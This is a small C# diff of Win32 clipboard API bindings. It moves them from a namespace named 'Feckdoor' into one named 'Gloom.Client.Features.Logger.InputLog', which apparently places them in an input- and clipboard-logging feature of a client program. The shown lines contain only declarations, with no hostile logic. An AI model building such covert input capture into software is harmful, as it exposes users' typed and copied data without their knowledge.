@@ -1,7 +1,7 @@
 ﻿using System.Runtime.InteropServices;
 using System.Text;
 
-namespace Feckdoor
+namespace Gloom.Client.Features.Logger.InputLog
 {
 	public static class User32
 	{
@@ -88,7 +88,7 @@ namespace Feckdoor
 		public static extern bool CloseClipboard();
 
 		[DllImport("user32.dll", SetLastError = true)]
-		public unsafe static extern int GetPriorityClipboardFormat([In] uint *priorityList, [In] int formats);
+		public unsafe static extern int GetPriorityClipboardFormat([In] uint* priorityList, [In] int formats);
 
 		[DllImport("user32.dll", SetLastError = true)]
 		public static extern IntPtr GetClipboardData([In] uint format);
